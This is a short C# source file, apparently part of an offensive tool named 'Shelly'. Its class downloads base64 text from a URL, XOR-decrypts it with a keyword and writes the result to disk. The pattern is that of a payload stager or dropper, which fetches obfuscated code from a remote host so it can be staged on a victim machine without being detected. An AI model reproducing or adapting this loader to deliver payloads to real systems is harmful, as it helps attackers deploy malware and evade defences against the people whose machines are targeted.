using cryptic;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Shelly
{
    public class InMemToFile
    {
        public async Task DecryptAndSaveToFile(string url, string decryptedFilePath, string keyword)
        {
            using (var client = new HttpClient())
            {
                var base64EncodedData = await client.GetStringAsync(url);
                var encodedData = Convert.FromBase64String(base64EncodedData);
                var inputData = encodedData;
                var xorDecrypted = XOR.XorEncDec(inputData, keyword);
                File.WriteAllBytes(decryptedFilePath, xorDecrypted);

                Console.WriteLine($"In Memory Decrypted file saved to {decryptedFilePath}");
            }
        }
    }
}
